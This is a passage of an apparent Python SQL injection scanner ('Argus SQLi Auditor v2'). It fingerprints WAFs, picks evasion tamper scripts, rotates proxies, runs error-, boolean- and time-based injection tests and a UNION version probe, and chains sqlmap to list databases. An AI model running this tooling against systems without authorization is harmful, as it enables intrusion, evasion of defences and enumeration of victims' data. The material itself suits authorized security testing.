            cmd, capture_output=True, text=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        log.warning("    sqlmap chain timed out")
        return False, [], ""
    except FileNotFoundError:
        return False, [], ""

    output = (proc.stdout or "") + "\n" + (proc.stderr or "")
    confirmed = bool(re.search(
        r"Parameter:\s*" + re.escape(param) + r".*?(vulnerable|injectable)",
        output, re.I | re.S,
    ))

    databases: list[str] = []
    in_db_block = False
    for line in output.splitlines():
        if re.search(r"available databases", line, re.I):
            in_db_block = True
            continue
        if in_db_block:
            m = re.match(r"^\[\*\]\s+(\S+)", line.strip())
            if m:
                databases.append(m.group(1))
            elif line.strip() and not line.strip().startswith("["):
                in_db_block = False

    excerpt = "\n".join(output.splitlines()[-40:])
    return confirmed, databases, excerpt


# ═════════════════════════════════════════════════════════════════════════════
#  DB SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[SQLiFinding]) -> None:
    if not findings or not DB_AVAILABLE or DB is None:
        return
    if not _cfg("SYNC_TO_DB", True) or not _cfg("BRIDGE_ENABLED", False):
        return
    if not getattr(DB, "available", False):
        return
    try:
        result = DB.upsert_sqli_findings(scan_id, [f.to_dict() for f in findings])
        if result is not None:
            log.info(f"  DB sync: {result} SQLi finding(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_sqli_audit(
    urls_file: Path,
    outdir: Path,
    *,
    rate_limit: Optional[int] = None,
    timeout: Optional[int] = None,
    test_error: bool = True,
    test_boolean: bool = True,
    test_time: bool = True,
    tamper_names: Optional[list[str]] = None,
    enable_sqlmap_chain: bool = True,
    sqlmap_level: int = 2,
    sqlmap_risk: int = 1,
    proxies: Optional[list[str]] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()
    settings = _sqli_settings()
    eff_rate = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_timeout = timeout if timeout is not None else settings["timeout"]
    eff_jitter = settings["jitter"]
    eff_proxies = proxies if proxies is not None else list(settings["proxies"])

    urls = _load_urls(urls_file)
    outdir.mkdir(parents=True, exist_ok=True)
    auth_on = bool(_cfg("AUTH_ENABLED", False))

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Config : rate_limit={eff_rate}/s  jitter={eff_jitter}s  timeout={eff_timeout}s")
    log.info(f"  Tests  : error={test_error} boolean={test_boolean} time={test_time}")
    log.info(f"  Tamper : {tamper_names or 'auto-by-WAF'}")
    log.info(f"  Chain  : sqlmap={'ON (--dbs only)' if enable_sqlmap_chain else 'OFF'}")
    log.info(f"  Auth   : {'enabled' if auth_on else 'disabled'}")
    if eff_proxies:
        log.info(f"  Proxies: {len(eff_proxies)} configured (rotation)")
    log.info("")

    if not urls:
        return _write_empty(outdir, urls_file, start)

    confirmed: list[SQLiFinding] = []
    seen: set[str] = set()

    # Provisional profile — replaced per host after WAF detection
    profile = EvasionProfile(
        rate_limit=eff_rate, jitter=eff_jitter, proxies=eff_proxies,
    )

    with EvasionSession(profile=profile, timeout=eff_timeout) as session:
        for url in urls:
            pairs = _param_urls(url)
            if not pairs:
                log.debug(f"  No injectable parameters in {url}")
                continue

            log.info(f"  Auditing {url}  ({len(pairs)} param(s))")

            # ── WAF fingerprint ──────────────────────────────────────────
            waf = detect_waf(session, url)
            if waf.vendor != "unknown":
                log.info(f"    WAF      : {waf.vendor} (confidence {waf.confidence}%)")
                # Adapt evasion to the detected WAF
                session.profile.rate_limit = max(0.5, eff_rate * 0.6)
                session.profile.jitter = max(eff_jitter, 1.0)
                if tamper_names is None:
                    eff_tampers = DEFAULT_TAMPERS_BY_WAF.get(
                        waf.vendor, DEFAULT_TAMPERS_BY_WAF["unknown"],
                    )
                else:
                    eff_tampers = tamper_names
                log.info(f"    Evasion  : rate={session.profile.rate_limit}/s  "
                         f"tampers=[{','.join(eff_tampers)}]")
            else:
                eff_tampers = tamper_names or DEFAULT_TAMPERS_BY_WAF["unknown"]
                log.info(f"    WAF      : not detected")
                log.info(f"    Evasion  : rate={session.profile.rate_limit}/s  "
                         f"tampers=[{','.join(eff_tampers)}]")

            for param_name, _orig in pairs:
                log.info(f"    Parameter: {param_name}")

                baseline = capture_baseline(session, url)
                if baseline is None:
                    log.warning("      baseline capture failed — skipping")
                    continue
                log.debug(
                    f"      baseline: μ={baseline.mean_ms:.0f}ms "
                    f"σ={baseline.stdev_ms:.0f}ms  μ_len={baseline.mean_len:.0f}B"
                )

                finding: Optional[SQLiFinding] = None

                if test_error:
                    finding = test_error_based(
                        session, url, param_name, baseline,
                        auth_on, waf, eff_tampers,
                    )
                    if finding:
                        log.info(f"      [CONFIRMED/ERROR]  dbms={finding.dbms}")

                if finding is None and test_boolean:
                    finding = test_boolean_based(
                        session, url, param_name, baseline,
                        auth_on, waf, eff_tampers,
                    )
                    if finding:
                        log.info(f"      [CONFIRMED/BOOLEAN] dbms={finding.dbms}")

                if finding is None and test_time:
                    finding = test_time_based(
                        session, url, param_name, baseline,
                        auth_on, waf, eff_tampers,
                    )
                    if finding:
                        log.info(f"      [CONFIRMED/TIME]   dbms={finding.dbms} "
                                 f"tamper={finding.tamper}")

                if finding is None:
                    log.debug("      no confirmation — discarded")
                    continue

                # ── UNION version probe (upgrades severity) ─────────────
                union_ok = False
                if finding.dbms != "unknown":
                    union_ok, version, cur_db = probe_union_version(
                        session, url, param_name, finding.dbms,
                    )
                    if union_ok:
                        finding.version_string = version
                        finding.current_database = cur_db
                        log.info(f"      UNION version confirmed: {version}")

                # ── sqlmap chain (databases-only) ───────────────────────
                sqlmap_ok, dbs, excerpt = False, [], ""
                if enable_sqlmap_chain:
                    sqlmap_ok, dbs, excerpt = run_sqlmap_chain(
                        url, param_name, finding.dbms, eff_tampers,
                        level=sqlmap_level, risk=sqlmap_risk,
                        threads=1, delay=max(1.0, 2.0 / max(eff_rate, 0.5)),
                    )
                    if sqlmap_ok:
                        finding.sqlmap_confirmed = True
                        if dbs:
                            finding.databases = dbs
                            log.info(f"      sqlmap enumerated {len(dbs)} database(s): "
                                     f"{', '.join(dbs[:5])}")
                        else:
                            log.info("      sqlmap confirmed injection "
                                     "(database enumeration blocked)")
                    elif excerpt:
                        log.debug(f"      sqlmap output tail:\n{excerpt}")

                # ── Severity rating ─────────────────────────────────────
                severity, reason = _severity_for(
                    technique=finding.technique,
                    dbms=finding.dbms,
                    union_confirmed=union_ok,
                    sqlmap_confirmed=sqlmap_ok,
                    sqlmap_databases=dbs,
                )
                finding.severity = severity
                finding.severity_reason = reason
                finding.evasion_profile = {
                    "rate_limit": session.profile.rate_limit,
                    "jitter":     session.profile.jitter,
                    "tampers":    eff_tampers,
                    "waf_vendor": waf.vendor,
                }

                log.info(f"      [SEVERITY] {severity.value} — {reason}")

                key = f"{finding.url}|{finding.parameter}|{finding.technique}|{finding.dbms}"
                if key in seen:
                    log.debug("      duplicate — skipped")
                    continue
                seen.add(key)
                confirmed.append(finding)
                log.info("      ✓ persisted")

            log.info("")

    elapsed = time.monotonic() - start

    # Sort: severity desc, confidence desc
    confirmed.sort(key=lambda f: (-f.severity.rank, -f.confidence, f.url))

    # ── Write confirmed-only JSON ───────────────────────────────────────
    json_path = outdir / "sqli_confirmed.json"
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "auth_enabled": auth_on,
        "config": {
            "rate_limit":          eff_rate,
            "jitter":              eff_jitter,
            "timeout":             eff_timeout,
            "test_error":          test_error,
            "test_boolean":        test_boolean,
            "test_time":           test_time,
            "sqlmap_chain":        enable_sqlmap_chain,
            "sqlmap_level":        sqlmap_level,
            "sqlmap_risk":         sqlmap_risk,
        },
        "totals": {
            "urls_input":     len(urls),
            "confirmed":      len(confirmed),
            "critical":       sum(1 for f in confirmed if f.severity == Severity.CRITICAL),
            "high":           sum(1 for f in confirmed if f.severity == Severity.HIGH),
            "medium":         sum(1 for f in confirmed if f.severity == Severity.MEDIUM),
            "low":            sum(1 for f in confirmed if f.severity == Severity.LOW),
            "by_technique":   _count_by(confirmed, "technique"),
            "by_dbms":        _count_by(confirmed, "dbms"),
            "by_waf":         _count_by(confirmed, "waf_vendor"),
        },
        "findings": [f.to_dict() for f in confirmed],
    }
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # ── Human-readable summary ──────────────────────────────────────────
    _write_summary(outdir / "sqli_summary.txt", confirmed, urls_file)

    # ── DB sync ─────────────────────────────────────────────────────────
    if scan_id is not None and confirmed:
        log.info(f"  Syncing {len(confirmed)} finding(s) to remote database...")
        _self_sync(scan_id, confirmed)

    # ── Console summary ─────────────────────────────────────────────────
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<26} {len(confirmed):>4} confirmed finding(s)")
    log.info(f"    sqli_summary.txt            {len(confirmed):>4} finding block(s)")
    log.info("")
    log.info(
        f"  Severity: CRITICAL={report['totals']['critical']}  "
        f"HIGH={report['totals']['high']}  "
        f"MEDIUM={report['totals']['medium']}  "
        f"LOW={report['totals']['low']}"
    )
    if confirmed:
        log.info("")
        log.info("  Confirmed findings:")
        for f in confirmed[:15]:
            extra = ""
            if f.databases:
                extra = f"  dbs={len(f.databases)}"
            elif f.version_string:
                extra = f"  version={f.version_string}"
            log.info(
                f"    [{f.severity.value:<8}] {f.technique:<7} {f.dbms:<10} "
                f"conf={f.confidence:<3} {f.url[:50]}  param={f.parameter}{extra}"
            )
    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _count_by(findings: list[SQLiFinding], attr: str) -> dict[str, int]:
    counts: dict[str, int] = {}
    for f in findings:
        val = getattr(f, attr, "unknown")
        counts[val] = counts.get(val, 0) + 1
    return counts


def _write_summary(path: Path, findings: list[SQLiFinding], input_file: Path) -> None:
    lines = [
        f"SQLi audit — {datetime.now(timezone.utc).isoformat()}",
        f"Input: {input_file}",
        f"Confirmed findings: {len(findings)}",
        "",
    ]
    for f in findings:
        lines.append("─" * 70)
        lines.append(f"[{f.severity.value}]  {f.technique}  {f.dbms}")
        lines.append(f"  URL        : {f.url}")
        lines.append(f"  Parameter  : {f.parameter} ({f.method})")
        lines.append(f"  Confidence : {f.confidence}")
        lines.append(f"  Payload    : {f.payload[:200]}")
        lines.append(f"  Tamper     : {f.tamper}")
        lines.append(f"  WAF        : {f.waf_vendor} ({f.waf_confidence}%)")
        if f.version_string:
            lines.append(f"  Version    : {f.version_string}")
        if f.current_database:
            lines.append(f"  Current DB : {f.current_database}")
        if f.databases:
            lines.append(f"  Databases  : {', '.join(f.databases)}")
        lines.append(f"  Evidence   : {f.evidence[:300]}")
        lines.append(f"  Rationale  : {f.severity_reason}")
        lines.append("")
    path.write_text("\n".join(lines))


def _write_empty(outdir: Path, input_file: Path, start: float) -> Path:
    path = outdir / "sqli_confirmed.json"
    path.write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "totals": {"urls_input": 0, "confirmed": 0,
                   "critical": 0, "high": 0, "medium": 0, "low": 0,
                   "by_technique": {}, "by_dbms": {}, "by_waf": {}},
        "findings": [],
    }, indent=2) + "\n")
    (outdir / "sqli_summary.txt").write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    logging.basicConfig(
        level=logging.DEBUG,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "live_urls.txt"

    parser = argparse.ArgumentParser(description="Argus SQLi Auditor v2")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=base / "output")
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--timeout", type=int, default=None)
    parser.add_argument("--no-error", action="store_true")
    parser.add_argument("--no-boolean", action="store_true")
    parser.add_argument("--no-time", action="store_true")
    parser.add_argument("--no-sqlmap", action="store_true")
    parser.add_argument("--sqlmap-level", type=int, default=2)
    parser.add_argument("--sqlmap-risk", type=int, default=1)
    parser.add_argument("--tampers", default=None)
    parser.add_argument("--proxies", default=None,
                        help="Comma-separated proxy URLs")
    args = parser.parse_args()

    tamper_names = args.tampers.split(",") if args.tampers else None
    proxies = args.proxies.split(",") if args.proxies else None

    run_sqli_audit(
        args.input, args.output,
        rate_limit=args.rate_limit,
        timeout=args.timeout,
        test_error=not args.no_error,
        test_boolean=not args.no_boolean,
        test_time=not args.no_time,
        tamper_names=tamper_names,
        enable_sqlmap_chain=not args.no_sqlmap,
        sqlmap_level=args.sqlmap_level,
        sqlmap_risk=args.sqlmap_risk,
        proxies=proxies,
        scan_id=args.scan_id,
    )
